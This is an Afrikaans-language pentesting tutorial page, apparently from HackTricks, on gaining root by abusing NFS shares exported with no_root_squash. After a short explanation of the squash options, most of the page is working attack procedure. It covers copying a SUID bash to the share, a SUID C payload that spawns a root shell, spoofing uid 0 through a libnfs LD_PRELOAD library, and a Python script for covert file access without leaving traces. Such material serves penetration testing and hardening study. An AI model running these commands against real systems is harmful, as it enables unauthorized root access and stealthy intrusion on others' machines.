{{#include ../../banners/hacktricks-training.md}}

# Basiese Inligting oor Squashing

NFS sal gewoonlik (veral in linux) die aangeduide `uid` en `gid` deur die kliënt wat aansluit om toegang tot die lêers te verkry (as kerberos nie gebruik word nie) vertrou. Daar is egter 'n paar konfigurasies wat op die bediener gestel kan word om **hierdie gedrag te verander**:

- **`all_squash`**: Dit squash al die toegang deur elke gebruiker en groep na **`nobody`** (65534 unsigned / -2 signed) te map. Daarom is almal `nobody` en geen gebruikers word gebruik nie.
- **`root_squash`/`no_all_squash`**: Dit is die standaard op Linux en **squash slegs toegang met uid 0 (root)**. Daarom word enige `UID` en `GID` vertrou, maar `0` word na `nobody` gesquash (so geen root-imperonering is moontlik nie).
- **``no_root_squash`**: Hierdie konfigurasie, indien geaktiveer, squash nie eens die root-gebruiker nie. Dit beteken dat as jy 'n gids met hierdie konfigurasie monteer, jy dit as root kan benader.

In die **/etc/exports** lêer, as jy 'n gids vind wat as **no_root_squash** geconfigureer is, kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** asof jy die plaaslike **root** van die masjien was.

Vir meer inligting oor **NFS** kyk:

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Afgeleë Exploit

Opsie 1 met bash:
- **Monteer daardie gids** in 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer die **/bin/bash** binêre en gee dit **SUID** regte, en **voer uit vanaf die slagoffer** masjien daardie bash binêre.
- Let daarop dat om root binne die NFS deel te wees, **`no_root_squash`** op die bediener geconfigureer moet wees.
- As dit egter nie geaktiveer is nie, kan jy na 'n ander gebruiker opgradeer deur die binêre na die NFS deel te kopieer en dit die SUID toestemming te gee as die gebruiker waarnatoe jy wil opgradeer.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 met c gecompileerde kode:
- **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer ons gecompileerde payload wat die SUID-toestemming sal misbruik, gee vir dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
- Dieselfde beperkings as voorheen
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Plaaslike Exploit

> [!NOTE]
> Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te exploiteer deur die vereiste poorte te tunnelle**.\
> Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy in elk geval nie** die **remote exploit** kan gebruik nie en jy sal hierdie truuk **moet misbruik**.\
> 'n Ander vereiste vir die exploit om te werk is dat **die eksport binne `/etc/export`** **die `insecure` vlag moet gebruik**.\
> --_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP adres aandui nie_--

## Basiese Inligting

Die scenario behels die eksploitering van 'n gemonteerde NFS deel op 'n plaaslike masjien, wat 'n fout in die NFSv3 spesifikasie benut wat die kliënt toelaat om sy uid/gid te spesifiseer, wat moontlik ongeoorloofde toegang moontlik maak. Die eksploitering behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC oproepe toelaat.

### Kompilerings van die Biblioteek

Die biblioteek kompileringsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval is die fallocate syscalls kommentaar gegee. Die kompileringsproses behels die volgende opdragte:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Die Uitbuiting Voer

Die uitbuiting behels die skep van 'n eenvoudige C-program (`pwn.c`) wat voorregte na root verhoog en dan 'n shell uitvoer. Die program word gecompileer, en die resulterende binêre (`a.out`) word op die deel geplaas met suid root, met gebruik van `ld_nfs.so` om die uid in die RPC-oproepe te vervals:

1. **Compileer die uitbuitingskode:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Plaas die exploit op die deel en wysig sy toestemmings deur die uid te vervals:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Voer die ontploffing uit om wortelregte te verkry:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell vir Stealthy File Toegang

Sodra root-toegang verkry is, om met die NFS-aandeel te kommunikeer sonder om eienaarskap te verander (om te verhoed dat daar spore agtergelaat word), word 'n Python-skrip (nfsh.py) gebruik. Hierdie skrip pas die uid aan om te ooreenstem met dié van die lêer wat toegang verkry, wat interaksie met lêers op die aandeel moontlik maak sonder toestemmingkwessies:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Loop soos:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
